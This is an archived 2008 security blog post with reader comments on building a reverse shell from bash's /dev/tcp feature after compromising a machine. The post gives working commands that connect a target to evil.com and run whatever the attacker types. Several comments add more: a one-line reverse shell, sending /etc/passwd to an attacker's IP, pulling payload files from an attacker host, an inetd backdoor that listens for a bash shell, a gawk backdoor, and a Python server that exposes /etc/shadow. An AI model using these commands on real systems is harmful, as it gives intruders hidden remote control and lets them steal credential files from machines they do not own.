<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Reverse Shell with Bash</title><meta name="description" content="I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the Agile Hacking project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat."><meta property="name" content="Reverse Shell with Bash"><meta itemprop="name" content="Reverse Shell with Bash"><meta property="description" content="I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the Agile Hacking project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat."><meta itemprop="description" content="I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the Agile Hacking project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Freverse-shell-with-bash%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Freverse-shell-with-bash%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/reverse-shell-with-bash/"><meta property="og:title" content="Reverse Shell with Bash"><meta property="og:description" content="I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the Agile Hacking project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Freverse-shell-with-bash%2F?w=1024"><meta name="twitter:title" content="Reverse Shell with Bash"><meta name="twitter:description" content="I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the Agile Hacking project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Freverse-shell-with-bash%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Reverse Shell with Bash</h1><div class="date">Sat, 19 Apr 2008 11:03:39 GMT</div><div class="author">by pdp</div><div id="post-content"><p>I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the <a href="/blog/agile-hacking/">Agile Hacking</a> project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat.</p>
<p>When we compromise a machine we often need to provide ourselves with a user friendly access to the system. This is where command shells come into place. The typical shell consists of a generic network client, typically netcat, listening on a remote port which pipes output into something like bash or any other command shell. Another type of shell is the reverse shell which consists of a generic network client, again something like netcat, connecting to the attacker&#39;s machine and piping input to bash. Most of the time, the attacker will use netcat, because this tool can be easily found on most system or easily compiled from source if required.</p>
<p>Although netcat is very useful, and you may have to use it in most cases, here is a simple technique which emulates what netcat does but it relies on bash only. Let&#39;s see how.</p>
<p>In step one we start a listening service on our box. We can use netcat, or whatever you might have at hand.</p>
<pre><code>$ nc -l -p 8080 -vvv</code></pre><p>On the target we have to perform some bash-fu. We will create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor.</p>
<pre><code>$ exec 5&lt;&gt;/dev/tcp/evil.com/8080
$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><p>There you go. Now everything we type in our local listening server will get executed on the target and the output of the commands will be piped back. Keep in mind that we don&#39;t use any 3rd-party tools on the target but its default shell. This technique comes handy in many situations and it leaves very small footprint on the targeted system.</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian 'pagvac' Pastor"><span class="post-comment-author">Adrian 'pagvac' Pastor</span><div class="post-comment-content">This is the kind of stuff I like. As we tend to say: "there is always an easier way to solve the problem".</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/18067dcaf3d81bfd125eefc797c20e5e?s=256&amp;d=retro" alt="ernie"><span class="post-comment-author">ernie</span><div class="post-comment-content">This shit doesn't work everywhere, you need to have compiled support in bash for it, and since it's very broken, most distributions do not ship bash enabled with this feature.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/01822efaf66e4b81d6f947cba7e0613a?s=256&amp;d=retro" alt="Anonymous"><span class="post-comment-author">Anonymous</span><div class="post-comment-content">Nice, but I preferred the original write-up ;) http://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/d489a8c17c4e9796fbe57a8f10073511?s=256&amp;d=retro" alt="Tecky"><span class="post-comment-author">Tecky</span><div class="post-comment-content">To bad is not working on debian distributions.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/d1b4bb13f49bd2d1c061d33109f9962f?s=256&amp;d=retro" alt="dude dyde"><span class="post-comment-author">dude dyde</span><div class="post-comment-content">give credit where its due.  this was posted yesterday on some other sites prior.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/3e8f21136dcd2cafc2e684fd1546c45f?s=256&amp;d=retro" alt="kcghost"><span class="post-comment-author">kcghost</span><div class="post-comment-content">a cool trick, but is there a convenient way of doing this in debian? Debian doesnt have the "/dev/tcp" feature as part of its bash by default, is there a way to get around that and use something else?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">first of all, I find this feature working on far too many systems. Second, similar things can be done with TCL and 3rd, I don't read every single blog out there to know that someone has blogged about it as well, neither I claim that it is new. If someone has posted similar technique somewhere else, it is just a coincidence. On another note, giving credits for something like this, is a bit stupid. :) It is like giving credits to someone for writing a <q>for</q> loop in bash. This is a feature not an ingenious hack. Also, my example significantly differs from the example provided by the blog post suggested above. thanks for the heads up and apologies to those who think that I have ripped off their work. It is certainly not the case.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b28d5fe8da784e36235a487c03a47353?s=256&amp;d=retro" alt="otze"><span class="post-comment-author">otze</span><div class="post-comment-content">Nice one, but on my system the man page of bash states the following: :( NOTE: Bash, as packaged for Debian, does not support using the /dev/tcp and /dev/udp files.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">if you don't have this feature compiled you can use TCL which is most likely installed on the system. Now, this defeats the purpose of the technique presented here but it might be better in some situations when you are restricted in terms of being able to upload netcat for example. For more information on using TCL socket features, read the following link: http://www.tcl.tk/man/tcl8.4/TclCmd/socket.htm</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">otze, unfortunately Debian does not support it. keep in mind that Debian mainly uses very old <q>stable</q> packages. Which is good and bad at the same time.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c65f2a23045a747655b93b343d1f5000?s=256&amp;d=retro" alt="Venom23"><span class="post-comment-author">Venom23</span><div class="post-comment-content">You are my idol #1</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c65f2a23045a747655b93b343d1f5000?s=256&amp;d=retro" alt="Venom23"><span class="post-comment-author">Venom23</span><div class="post-comment-content">Yes! Works fine on Solaris 9 and 10. Always had problems getting a netcat compiled on Solaris. Hate gcc problems on Solaris. The netcat version provided by sunfreeware.com does not include the "-e" option for bidirectional communication.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a47fd875e50eda99c98b3160ec3df5ba?s=256&amp;d=retro" alt="Sam"><span class="post-comment-author">Sam</span><div class="post-comment-content">I tried this on a ubuntu server and it does not work  in it's default configuration. If you build the bash using the use --enable-net-redirections build flag it will work. Just in case someone else was wondering why it wouldn't work.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2ed1cf60e18830bcdff9bf232faee040?s=256&amp;d=retro" alt="Adri"><span class="post-comment-author">Adri</span><div class="post-comment-content">Nice stuff, I really love this website :D</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="Jim Kelly"><span class="post-comment-author">Jim Kelly</span><div class="post-comment-content">I checked the bash man page on Mac OS X 10.5.2 and it DOES support <code>/dev/tcp</code>!!

jk</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="Jim Kelly"><span class="post-comment-author">Jim Kelly</span><div class="post-comment-content">I just tried it on Mac OS X Leopard and it works!! caveat I connected to and from localhost so my next test, time willing will be to try to/from another host. Nothing shows up on the victim host, all std out shows up on attacker side ;-) pdp awesome awesome tip!!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/779cb6e06b596400446c3076bb13785a?s=256&amp;d=retro" alt="Yash Kadakia"><span class="post-comment-author">Yash Kadakia</span><div class="post-comment-content">Thanks for the tip! Its an interesting concept to minimize the footprint on the client machine.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6125da169bce604fdf9bd2d55233e5bc?s=256&amp;d=retro" alt="tix"><span class="post-comment-author">tix</span><div class="post-comment-content">you can remove the <code>cat &lt;&amp;5</code>, will be:

<pre><code>while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>

there is also the <code>$REPLY</code> var of the read builtin command.

thnks for the stuff gnucitizen.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6c6d4834c788c4a760b164e358245d5d?s=256&amp;d=retro" alt="nicolasfr"><span class="post-comment-author">nicolasfr</span><div class="post-comment-content">Why using two lines/commands? A one liner version:

<pre><code>$ bash -i &gt;&amp; /dev/tcp/evil.com/8080 0&gt;&amp;1</code></pre>

Note: <code>/dev/tcp</code> support is enabled by default on Redhat. Disabled on Debian. Would be nice to list here support for other well known distro (Suse?).</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="Jim Kelly"><span class="post-comment-author">Jim Kelly</span><div class="post-comment-content">Ok here is an idea of how to turn this into a port scanner: Say you are on box 192.168.1.2 and you want to port scan ports 79,80,81 on 192.168.1.1 do the following all on one line:

<pre><code>for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>

What you end up with is something like this:

<pre><code>bash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done
[1] 5579
79
bash: connect: Connection refused
bash: /dev/tcp/192.168.1.1/79: Connection refused
[1]+  Done                    echo $i
[1] 5581
80
[1]+  Done                    echo $i
[1] 5584
81
bash: connect: Connection refused
bash: /dev/tcp/192.168.1.1/81: Connection refused
[1]+  Done                    echo $i
bash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>

Closed ports give you back a "Connection refused"</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="Jim Kely"><span class="post-comment-author">Jim Kely</span><div class="post-comment-content">LOL Google is truely my friend: http://www.oreilly.com/pub/h/5299 A tcp and udp portscanner implimented in Bash ;-)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">sweet!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=256&amp;d=retro" alt="Marchiner"><span class="post-comment-author">Marchiner</span><div class="post-comment-content">It works ok on debian, but only using TCL! :D But works fine! Thx for nice post pdp!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=256&amp;d=retro" alt="Marchiner"><span class="post-comment-author">Marchiner</span><div class="post-comment-content">Ops sorry.. really don work on debian. Works on Redhat Enterprise 4 and 5.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=256&amp;d=retro" alt="Marchiner"><span class="post-comment-author">Marchiner</span><div class="post-comment-content">Just to complement... i know this post its about the reverse shell.  But "debian users" whatch this post about Default-bash:/dev/tcp http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=146464</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Marchiner: wow this bug report goes back to 2002! How much longer till it's fixed ;-)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Ok this is off scope for this thread, and the moderator may not want it but here's a way to use /dev/tcp to banner a web server:

<pre><code>#!/bin/bash
exec 3&lt;&gt;/dev/tcp/$1/80
echo -e "Get /simple?se=1 HTTP/1.0\n" &gt;&amp;3
cat &lt;&amp;3</code></pre>

You'd feed the www.whatever.com on the command line.
 
usage:

<pre><code>./script www.whatever.com</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Correction: script should read:

<pre><code>#!/bin/bash
exec 3 /dev/tcp/$1/80
echo -e "Get /simple?se=1 HTTP/1.0\n" &gt;&amp;3
cat &lt;&amp;3</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8150b9645442ee255c68ec036085fdff?s=256&amp;d=retro" alt="f0rg3"><span class="post-comment-author">f0rg3</span><div class="post-comment-content">Useful, Thanks.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f3b0b062823d93fc92c37594e4b2c8af?s=256&amp;d=retro" alt="PsyEcho"><span class="post-comment-author">PsyEcho</span><div class="post-comment-content">Thanks 'pdp'. Nice concept &amp; article. Though doesn't work for my default Debian base, but surely gonna come handy for research! Kudos and keep up the good work :) Cheers.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">PDP Yeh this was old school goodness ;-) I love the idea of using what's already there. Now what I'd like is an equivalent on windows!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">unfortunately batch is very limited but you can do similar things with WScript combined with JavaScript(JScript) or VBScript. These stuff come by default on every Windows operating system.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">pdp

thanks for pointing me in the right direction ;-) Mr. Google sez: http://www.codeproject.com/KB/cs/ReverseRAT.aspx

LOL
Awesome!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Fun and games with <code>/dev/tcp</code> and file transfer: Ok here is how to use this bash <code>/dev/tcp</code> trick to move a file.

<ol>
<li>On attacker's box: I want to move a file named test.txt to the victim box<pre><code>cat test.txt | nc -l 3333</code></pre></li>
<li>I'll then connect out from victim to attacker's port 3333 and pull back the file <code>test.txt</code><pre><code>bash -i &gt;&amp; /dev/tcp/attackersIP/8080 0&gt;&amp;1 &gt; test.txt</code></pre></li>
</ol>

Advantages: netcat stays on the attacker's box. All I use on the victim box is what's already there...bash ;-)

--------------------------------------

ok so you are probably saying "That's nice" but if I'm already on the victim and I want to say transfer /etc/password or /etc/shadow back to my attacker's box and I'm too lazy to do terminal copy and paste...then what?

<ol>
<li>on attacker's box do<pre><code>nc -l -p 8080 -vvv &gt; passwd</code></pre></li>
<li>on victim box do<pre><code>cat /etc/passwd &gt; /dev/tcp/attackerIP/8080</code></pre></li>
</ol>

and like magic the victim's /etc/password is transferred to the attacker's box.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Transfer a file using HTTP: Say you have compromised a victim box and want to transfer a file to the victim. 

1. Put the file in the web root of the attacker box (I'm thinking of the web server in backtrack.
2. Start up the web server on the attacker box
3. On the victim box do:

<pre><code>(echo -e "GET /filename_you_are_moving HTTP/0.9\r\n\r\n" \
1&gt;&amp;3 &amp; cat 0&lt;&amp;3) 3 /dev/tcp/AttackerIP/80 \
| (read i; while [ "$(echo $i | tr -d '\r')" != "" ]; \
do read i; done; cat) &gt; local_filename</code></pre>

Credit where credit is due:
http://www.pebble.org.uk/linux/bashbrowser</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2b126676a67d146691c4d3b0de4c8db0?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Here is an important thing I just realized...d'oh this /dev/tcp/ thing can only connect outbound, it cannot listen and receive a connection like netcat. As far as I can tell ;-)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">BTW the /dev/tcp and /dev/udp is also a feature of the Korn shell. Korn shell is robust shell favored by *nix oldskoolers. You will find it installed by default on Mac OS X. I don't believe it comes default on the remainder of the BSDs(free and open). As far as I can tell it works pretty much the way it does under Bash.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Ok here's some old skool stuff. To create a listener on a *nix box running inetd (as apposed to xinetd)

<ul>
<li>Pick an obscure service from <code>/etc/services</code> associated with a tcp port 1024 and above...for example laplink <pre><code>laplink         1547/tcp     # laplink</code></pre></li>
<li>Add the following line to <code>/etc/inetd.conf</code> <pre><code>laplink    stream  tcp     nowait  /bin/bash bash -i</code></pre></li>
<li>restart <code>inetd.conf</code> <pre><code>killall -HUP inetd</code></pre></li>
</ul>

<strong>Explaination:</strong> You are creating a listener on port tcp/1547 that will shovel you a bash shell.

<strong>Caveat:</strong> this obviously is not my *idea* It's just very VERY old stuff that still works.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Ok I know I know I'm obsessive ;-) Here is a reverse shell implemented in gawk

Credit: Phrack 62

<pre><code>#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd&gt; "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |&amp; Service
                        Service |&amp; getline cmd
                        if (cmd) {
                                while ((cmd |&amp; getline) &gt; 0)
                                        print $0 |&amp; Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}</pre></code></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Yes exact citation for above is p62-0x08_Remote_Exec.txt "FIST! FIST! FIST! Its all in the wrist: Remote Exec" by grugg</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=256&amp;d=retro" alt="macubergeek"><span class="post-comment-author">macubergeek</span><div class="post-comment-content">Python Trick

If you can use a web app to execute shell commands on the victim:

<pre><code>cd / &amp;&amp; python -m SimpleHTTPServer</code></pre>

then

Python will start it's own web server listening on port 8000. You can surf to the victim on that port: <code>http://victim:8000</code> and then transverse the entire file system and download <code>/etc/passwd</code> and <code>/etc/shadow</code>.

Tested on macos x 10.5.3 and Safari 3.1.1. For other *nix variants, your mileage may vary.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f5ccc3e8b23493df26861d148cd93815?s=256&amp;d=retro" alt="edward baddouh"><span class="post-comment-author">edward baddouh</span><div class="post-comment-content">nice work pdp, keep on going!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6553298663f3ce100c6163e6f926980b?s=256&amp;d=retro" alt="vecna"><span class="post-comment-author">vecna</span><div class="post-comment-content">http://www.delirandom.net/20080323/ping-is-the-most-deployed-backdoor-on-the-net-omg/ the same prerequisite, but traffic is encoded in icmp.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">this is quite interesting. thanks for sharing.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/405305d505e5f3191e29a5db057fbcdf?s=256&amp;d=retro" alt="Jeff Price"><span class="post-comment-author">Jeff Price</span><div class="post-comment-content">2 way /dev/tcp communication on debian. Use netcat

<pre><code>mkfifo mypipe
cat mypipe|/bin/bash|nc -l -p 6000 &gt;mypipe</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=256&amp;d=retro" alt="pagvac"><span class="post-comment-author">pagvac</span><div class="post-comment-content">@Jeff: awesome. just tested it on my ubuntu workstation and works like a charm. thanks for sharing!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/3158cf408532b750f5ba4783447d0b83?s=256&amp;d=retro" alt="revtan"><span class="post-comment-author">revtan</span><div class="post-comment-content">thanks for nice article...

<pre><code>(macubergeek == pdp)  ? ;-P : ;-|</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">not really! :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/42aafcdfd5d741de9b581d215c696c91?s=256&amp;d=retro" alt="Guy"><span class="post-comment-author">Guy</span><div class="post-comment-content">I doubt whether this can be correct. 

The man page of nc mentions this w.r.t. to the <code>-l</code> option": "It is an error to use this <code>[l-]</code> option in conjunction with the <code>-p</code>, <code>-s</code>, or <code>-z</code> options."</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2020 <a href=""></a>. All rights reserved.</p></footer></body></html>